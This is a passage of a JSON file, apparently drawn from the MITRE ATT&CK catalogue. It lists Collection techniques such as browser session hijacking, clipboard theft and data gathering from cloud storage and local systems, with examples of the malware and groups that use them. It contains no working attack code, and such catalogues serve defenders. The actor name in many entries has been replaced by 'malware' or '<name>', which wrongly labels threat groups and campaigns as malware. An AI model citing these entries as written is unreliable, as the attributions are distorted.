            "S0090": {
                "ID": "S0090",
                "Name": "Rover",
                "Description": "malware automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.[44]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.[45][46]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.[47]"
            },
            "G0121": {
                "ID": "G0121",
                "Name": "Sidewinder",
                "Description": "malware has used tools to automatically collect system and network configuration information.[48]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions.[49]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, .ppt, .xls, .docx, .pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.[50]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to index and compress files into a send queue for exfiltration.[51]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware ran a command to compile an archive of file types of interest from the victim user's directories.[52]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has collected information automatically using the adversary's USBferry attack.[53]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "For all non-removable drives on a victim, malware executes automated collection of certain files for later exfiltration.[54]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can download a module to search for and build a report of harvested credential data.[55]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .[56]"
            },
            "S0466": {
                "ID": "S0466",
                "Name": "WindTail",
                "Description": "malware can identify and add files that possess specific file extensions to an array for archiving.[57]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz.[58][59]"
            }
        }
    },
    "T1185": {
        "ttp_name": "Browser Session Hijacking",
        "ttp_id": "T1185",
        "href": "/techniques/T1185",
        "tactic": "Collection",
        "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.[1]A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.[2][3] Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.[4]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has the ability to use form-grabbing to extract data from web data forms.[5]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has captured credentials when a user performs login through a SSL session.[6][7]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.[8]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.[4][9]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.[10]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[11][12][13]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  malware can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.[14][15]"
            },
            "S0530": {
                "ID": "S0530",
                "Name": "Melcoz",
                "Description": "malware can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.[11]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware can use advanced web injects to steal web banking credentials.[16][17]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.[18][19][20][21]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).[22]"
            }
        }
    },
    "T1115": {
        "ttp_name": "Clipboard Data",
        "ttp_id": "T1115",
        "href": "/techniques/T1115",
        "tactic": "Collection",
        "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications. For example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard.[1][2][3] Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).[4]macOS and Linux also have commands, such as pbpaste, to grab clipboard contents.[5]",
        "Procedure": {
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can steal data from the victim\u2019s clipboard.[6][7][8][9]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware used a Trojan called KEYLIME to collect data from the clipboard.[10]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used tools capable of stealing contents of the clipboard.[11]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. [12]"
            },
            "S0438": {
                "ID": "S0438",
                "Name": "Attor",
                "Description": "malware has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.[13]"
            },
            "S0454": {
                "ID": "S0454",
                "Name": "Cadelspy",
                "Description": "malware has the ability to steal data from the clipboard.[14]"
            },
            "S0261": {
                "ID": "S0261",
                "Name": "Catchamas",
                "Description": "malware steals data stored in the clipboard.[15]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware has the ability to capture and store clipboard data.[16][17]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware copies and exfiltrates the clipboard contents every 30 seconds.[18]"
            },
            "S0334": {
                "ID": "S0334",
                "Name": "DarkComet",
                "Description": "malware can steal data from the clipboard.[19]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware starts a thread on execution that captures clipboard data and logs it to a predefined log file.[20]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can download a clipboard information stealer module.[21]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can harvest clipboard data on both Windows and macOS systems.[22]"
            },
            "S0569": {
                "ID": "S0569",
                "Name": "Explosive",
                "Description": "malware has a function to use the OpenClipboard wrapper.[23]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware can collect clipboard data.[24]"
            },
            "S0531": {
                "ID": "S0531",
                "Name": "Grandoreiro",
                "Description": "malware can capture clipboard data from a compromised host.[25]"
            },
            "S0170": {
                "ID": "S0170",
                "Name": "Helminth",
                "Description": "The executable version of malware has a module to log clipboard contents.[26]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "A malware variant accesses a screenshot saved in the clipboard and converts it to a JPG image.[27]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can capture clipboard data.[28]"
            },
            "S0250": {
                "ID": "S0250",
                "Name": "Koadic",
                "Description": "malware can retrieve the current content of the user clipboard.[29]"
            },
            "S0356": {
                "ID": "S0356",
                "Name": "KONNI",
                "Description": "malware had a feature to steal data from the clipboard.[30]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware hijacks the clipboard data by creating an overlapped window that listens to keyboard events.[31][32]"
            },
            "S0282": {
                "ID": "S0282",
                "Name": "MacSpy",
                "Description": "malware can steal clipboard contents.[33]"
            },
            "S0652": {
                "ID": "S0652",
                "Name": "MarkiRAT",
                "Description": "malware can capture clipboard content.[34]"
            },
            "S0530": {
                "ID": "S0530",
                "Name": "Melcoz",
                "Description": "malware can monitor content saved to the clipboard.[35]"
            },
            "S0455": {
                "ID": "S0455",
                "Name": "Metamorfo",
                "Description": "malware has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's.[36][37]"
            },
            "S1122": {
                "ID": "S1122",
                "Name": "Mispadu",
                "Description": "malware has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host.[38]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors collected clipboard data in plaintext.[39]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware steals and modifies data from the clipboard.[40]"
            },
            "S0375": {
                "ID": "S0375",
                "Name": "Remexi",
                "Description": "malware collects text from the clipboard.[41]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can extract clipboard data from a compromised host.[42]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware collects data from the clipboard.[43][44]"
            },
            "S0253": {
                "ID": "S0253",
                "Name": "RunningRAT",
                "Description": "malware contains code to open and copy data from the clipboard.[45]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to steal data from the clipboard of an infected host.[46]"
            },
            "S0004": {
                "ID": "S0004",
                "Name": "TinyZBot",
                "Description": "malware contains functionality to collect information from the clipboard.[47]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware collects data stored in the clipboard.[48]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware can hook GetClipboardData function to watch for clipboard pastes to collect.[49]"
            }
        }
    },
    "T1530": {
        "ttp_name": "Data from Cloud Storage",
        "ttp_id": "T1530",
        "href": "/techniques/T1530",
        "tactic": "Collection",
        "description": "Adversaries may access data from cloud storage.Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories). Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.[1][2][3] There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.[4][5][6][7]Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can collect files from a user\u2019s OneDrive.[8]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[9]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has obtained files from the victim's cloud storage instances.[10]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can enumerate and download files stored in AWS storage services, such as S3 buckets.[11]"
            },
            "S0683": {
                "ID": "S0683",
                "Name": "Peirates",
                "Description": "malware can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.[12]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware enumerates data stored in cloud resources for collection and exfiltration purposes.[13]"
            }
        }
    },
    "T1602": {
        "ttp_name": "Data from Configuration Repository",
        "ttp_id": "T1602",
        "href": "/techniques/T1602",
        "subtechnique": {
            "001": {
                "name": "SNMP (MIB Dump)",
                "href": "/techniques/T1602/001",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).The MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages[1]. The MIB may also contain device operational information, including running configuration, routing table, and interface details.Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.[2][3]",
                "Procedure": {}
            },
            "002": {
                "name": "Network Device Configuration Dump",
                "href": "/techniques/T1602/002",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.[1][2] These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.",
                "Procedure": {}
            }
        },
        "tactic": "Collection",
        "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.[1][2]",
        "Procedure": {}
    },
    "T1213": {
        "ttp_name": "Data from Information Repositories",
        "ttp_id": "T1213",
        "href": "/techniques/T1213",
        "subtechnique": {
            "001": {
                "name": "Confluence",
                "href": "/techniques/T1213/001",
                "description": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentialsWork / project schedulesSource code snippetsLinks to network shares and other internal resources",
                "Procedure": {
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials.[1]"
                    }
                }
            },
            "002": {
                "name": "Sharepoint",
                "href": "/techniques/T1213/002",
                "description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentialsWork / project schedulesSource code snippetsLinks to network shares and other internal resources",
                "Procedure": {
                    "G1024": {
                        "ID": "G1024",
                        "Name": "Akira",
                        "Description": "<name> has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity.[1]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has collected information from Microsoft SharePoint services within target networks.[2]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[3]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has collected documents from the victim's SharePoint.[4]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> used a SharePoint enumeration and data dumping tool known as spwebmember.[5]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials.[6][7]"
                    },
                    "S0227": {
                        "ID": "S0227",
                        "Name": "spwebmember",
                        "Description": "<name> is used to enumerate and dump information from Microsoft SharePoint.[5]"
                    }
                }
            },
            "003": {
                "name": "Code Repositories",
                "href": "/techniques/T1213/003",
                "description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.[1][2]Note: This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> cloned victim user Git repositories during intrusions.[3]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials.[4][5]"
                    },
                    "G1015": {
                        "ID": "G1015",
                        "Name": "Scattered Spider",
                        "Description": "<name> enumerates data stored within victim code repositories, such as internal GitHub repositories.[6][7]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 downloaded source code from code repositories.[8]"
                    }
                }
            }
        },
        "tactic": "Collection",
        "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentialsWork / project schedulesSource code snippetsLinks to network shares and other internal resourcesInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as Sharepoint and Confluence, specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has collected files from various information repositories.[1]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has collected schemas and user accounts from systems running SQL Server.[2]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has accessed victim security and IT environments and Microsoft Teams to mine valuable information.[3]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.[4]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware has the ability to list and extract data from SQL databases.[5]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware exfiltrates data of interest from enterprise databases using Adminer.[6]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations.[7]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware has used a custom .NET tool to collect documents from an organization's internal central database.[8]"
            }
        }
    },
    "T1005": {
        "ttp_name": "Data from Local System",
        "ttp_id": "T1005",
        "href": "/techniques/T1005",
        "tactic": "Collection",
        "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information.[1] Adversaries may also use Automated Collection on the local system.",
        "Procedure": {
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware can collect local data from an infected machine.[2]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware can collect information from a compromised host.[3]"
            },
            "G0138": {
                "ID": "G0138",
                "Name": "Andariel",
                "Description": "malware has collected large numbers of files from compromised network systems for later extraction.[4]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can collect data on a compromised host.[5][6]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware has collected files from a local victim.[7]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.[8][9][10][11]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has stolen data from compromised hosts.[12]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "malware will identify Microsoft Office documents on the victim's computer.[13]"
            },
            "G0067": {
                "ID": "G0067",
                "Name": "APT37",
                "Description": "malware has collected data from victims' local systems.[14]"
            },
            "G0082": {
                "ID": "G0082",
                "Name": "APT38",
                "Description": "malware has collected data from a compromised host.[15]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used various tools to steal files from the compromised host.[16][17]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware has uploaded files and data from a compromised host.[18]"
            },
            "S1029": {
                "ID": "S1029",
                "Name": "AuTo Stealer",
                "Description": "malware can collect data such as PowerPoint files, Word documents, Excel files, PDF files, text files, database files, and image files from an infected machine.[2]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has collected data from a compromised network.[19]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware has uploaded files from victims' machines.[20]"
            },
            "S0128": {
                "ID": "S0128",
                "Name": "BADNEWS",
                "Description": "When it first starts, malware crawls the victim's local drives and collects documents with the following extensions: .doc, .docx, .pdf, .ppt, .pptx, and .txt.[21][22]"
            },
            "S0337": {
                "ID": "S0337",
                "Name": "BadPatch",
                "Description": "malware collects files from the local system that have the following extensions, then prepares them for exfiltration: .xls, .xlsx, .pdf, .mdb, .rar, .zip, .doc, .docx.[23]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware can collect local files from the system .[24]"
            },
            "S0239": {
                "ID": "S0239",
                "Name": "Bankshot",
                "Description": "malware collects files from the local system.[25]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can retrieve information from the infected machine.[26]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has collected information from a compromised host.[27]"
            },
            "S0564": {
                "ID": "S0564",
                "Name": "BlackMould",
                "Description": "malware can copy files on a compromised host.[28]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has uploaded files from victim machines.[29]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware can upload files from a compromised host.[30]"
            },
            "G0060": {
                "ID": "G0060",
                "Name": "BRONZE BUTLER",
                "Description": "malware has exfiltrated files stolen from local systems.[31]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has the ability to upload files from a compromised system.[32]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can capture and compress stolen credentials from the Registry and volume shadow copies.[33]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors obtained files and data from the compromised network.[34]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[35]"
            },
            "C0026": {
                "ID": "C0026",
                "Name": "C0026",
                "Description": "During malware, the threat actors collected documents from compromised hosts.[36]"
            },
            "S0274": {
                "ID": "S0274",
                "Name": "Calisto",
                "Description": "malware can collect data from user directories.[37]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to collect information from the local database.[38]"
            },
            "S1043": {
                "ID": "S1043",
                "Name": "ccf32",
                "Description": "malware can collect files from a compromised host.[39]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can collect data and files from a compromised host.[40]"
            },
            "S0020": {
                "ID": "S0020",
                "Name": "China Chopper",
                "Description": "malware's server component can upload local files.[41][42][43][44]"
            },
            "S0667": {
                "ID": "S0667",
                "Name": "Chrommme",
                "Description": "malware can collect data from a local system.[45]"
            },
            "S0660": {
                "ID": "S0660",
                "Name": "Clambling",
                "Description": "malware can collect information from a compromised host.[46]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can collect data from a local system.[47][48]"
            },
            "S0492": {
                "ID": "S0492",
                "Name": "CookieMiner",
                "Description": "malware has retrieved iPhone text messages from iTunes phone backup files.[49]"
            },
            "S0050": {
                "ID": "S0050",
                "Name": "CosmicDuke",
                "Description": "malware steals user files from local hard drives with file extensions that match a predefined list.[50]"
            },
            "C0004": {
                "ID": "C0004",
                "Name": "CostaRicto",
                "Description": "During malware, the threat actors collected data and files from compromised networks.[51]"
            },
            "S1023": {
                "ID": "S1023",
                "Name": "CreepyDrive",
                "Description": "malware can upload files to C2 from victim machines.[52]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can collect information from a compromised host.[53]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware can exfiltrate files from compromised systems.[54]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware can retrieve files from the local file system.[55]"
            },
            "G1012": {
                "ID": "G1012",
                "Name": "CURIUM",
                "Description": "malware has exfiltrated data from a compromised machine.[56]"
            },
            "C0029": {
                "ID": "C0029",
                "Name": "Cutting Edge",
                "Description": "During malware, threat actors stole the running configuration and cache data from targeted Ivanti Connect Secure VPNs.[57][58]"
            },
            "S0687": {
                "ID": "S0687",
                "Name": "Cyclops Blink",
                "Description": "malware can upload files from a compromised host.[59]"
            },
            "S1014": {
                "ID": "S1014",
                "Name": "DanBot",
                "Description": "malware can upload files from compromised hosts.[60]"
            },
            "G0070": {
                "ID": "G0070",
                "Name": "Dark Caracal",
                "Description": "malware collected complete contents of the 'Pictures' folder from compromised Windows systems.[61]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can collect files from a compromised host.[62]"
            },
            "S1021": {
                "ID": "S1021",
                "Name": "DnsSystem",
                "Description": "malware can upload files from infected machines after receiving a command with uploaddd in the string.[63]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has collected data from local victim systems.[64]"
            },
            "S0694": {
                "ID": "S0694",
                "Name": "DRATzarus",
                "Description": "malware can collect information from a compromised host.[65]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware can transfer files from the victim machine.[66]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware can collect a variety of information from victim machines.[67]"
            },
            "S0634": {
                "ID": "S0634",
                "Name": "EnvyScout",
                "Description": "malware can collect sensitive NTLM material from a compromised host.[68]"
            },
            "S0404": {
                "ID": "S0404",
                "Name": "esentutl",
                "Description": "malware can be used to collect data from local file systems.[69]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware can copy files and directories from a compromised host.[70]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has gathered stolen credentials, sensitive data such as point-of-sale (POS), and ATM data from a compromised network before exfiltration.[71][72]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has collected and exfiltrated payment card data from compromised systems.[73][74][75]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has collected files and other sensitive information from a compromised network.[76]"
            },
            "S0696": {
                "ID": "S0696",
                "Name": "Flagpro",
                "Description": "malware can collect data from a compromised host, including Windows authentication information.[77]"
            },
            "S0036": {
                "ID": "S0036",
                "Name": "FLASHFLOOD",
                "Description": "malware searches for interesting files (either a default or customized set of file extensions) on the local system. malware will scan the My Recent Documents, Desktop, Temporary Internet Files, and TEMP directories. malware also collects information stored in the Windows Address Book.[78]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware has collected information and files from a compromised machine.[79]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware can retrieve configuration data from a compromised AD FS server.[80]"
            },
            "S0193": {
                "ID": "S0193",
                "Name": "Forfiles",
